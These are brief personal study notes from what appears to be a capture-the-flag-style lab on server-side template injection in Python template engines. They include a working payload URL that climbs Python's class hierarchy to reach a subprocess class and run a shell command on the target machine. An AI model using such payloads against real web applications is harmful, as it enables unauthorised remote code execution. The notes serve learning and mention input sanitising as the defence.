In this room :

- I learnt how to identify template engines with the nature of the payload
![image](https://github.com/poorvi1910/Web/assets/146640913/42ce11ee-f9f2-4fb2-befd-1b6cdcd08d30)

- Identify acceptible payloads : ENtering characters until one gives an error
- Building payloads using python classes
- ```http://MACHINE_IP:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}```
  In this class lets us go down the inheritance tree, mro back up and subclasses down again to get a list of modules from which we can select one as our payload.
- Securing applications by sanitising user input
